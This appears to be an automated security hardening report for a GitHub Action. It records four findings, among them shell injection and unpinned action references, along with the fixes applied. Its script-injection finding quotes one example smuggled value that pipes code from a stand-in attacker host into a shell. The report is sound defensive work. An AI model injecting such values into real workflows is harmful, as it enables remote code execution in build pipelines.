<!-- markdownlint-disable -->

# Hardening Report: fabasoad--setup-brainfuck-action/v1.1.1

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `2`

Action **fabasoad--setup-brainfuck-action/v1.1.1** was hardened automatically. 4 finding(s) were identified and resolved across 1 iteration(s).

## Findings Fixed

### script-injection (severity: high)

Sub-rule (a): The `run:` block in action.yml directly interpolates the expression `${{ inputs.version }}` into the shell command string: `pip3 install brainfucky==${{ inputs.version }}`. This allows an attacker (or any caller of this composite action) to inject arbitrary shell commands by supplying a crafted version string such as `0.1.dev1; curl -s https://evil.example/x | sh`. The value must be passed via an env: variable and double-quoted in the shell instead.

Locations:

- `action.yml:15`

### unpinned-uses (severity: high)

All `uses:` references in the workflow files use mutable tag/version refs instead of immutable 40-character SHA commit hashes, making the workflows vulnerable to supply-chain attacks if any referenced action is compromised or its tag is moved. Failing references:
- `actions/checkout@v3` (create-release.yml and functional-tests.yml)
- `simbo/changes-since-last-release-action@v1` (create-release.yml)
- `softprops/action-gh-release@v1` (create-release.yml)
- `fischerscode/tagger@v0` (create-release.yml)

Locations:

- `.github/workflows/create-release.yml:13`
- `.github/workflows/create-release.yml:16`
- `.github/workflows/create-release.yml:19`
- `.github/workflows/create-release.yml:28`
- `.github/workflows/functional-tests.yml:21`

### missing-permissions (severity: medium)

Neither `.github/workflows/create-release.yml` nor `.github/workflows/functional-tests.yml` declares a top-level `permissions:` key, and no job within either file has a `permissions:` block. Without explicit permissions, workflows run with the default (potentially broad) token permissions, violating the principle of least privilege. `create-release.yml` in particular creates releases and pushes tags, which requires write access — these should be explicitly scoped (e.g. `contents: write`).

Locations:

- `.github/workflows/create-release.yml:1`
- `.github/workflows/functional-tests.yml:1`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.version }}" appears directly in run: block of step "Install Brainfuck"; move to env: map

Locations:

- `action.yml:18`

## Iteration Notes

### Iteration 1

**Fixes applied:** script-injection, static-inline-injection, unpinned-uses, missing-permissions

**Notes:**

Fixed all four findings: (1) Script injection in action.yml: moved `${{ inputs.version }}` to an env: block as VERSION and referenced it as a double-quoted shell variable `"brainfucky==$VERSION"`. (2) Unpinned actions: pinned all five uses: references to full 40-char SHAs — actions/checkout@f43a0e5..., simbo/changes-since-last-release-action@45883b2..., softprops/action-gh-release@de2c0eb..., fischerscode/tagger@5ca3fa6... — with original tags preserved as comments. (3) Missing permissions: added `permissions: contents: write` to create-release.yml (required for creating releases and pushing tags) and `permissions: {}` to functional-tests.yml (no elevated permissions needed).

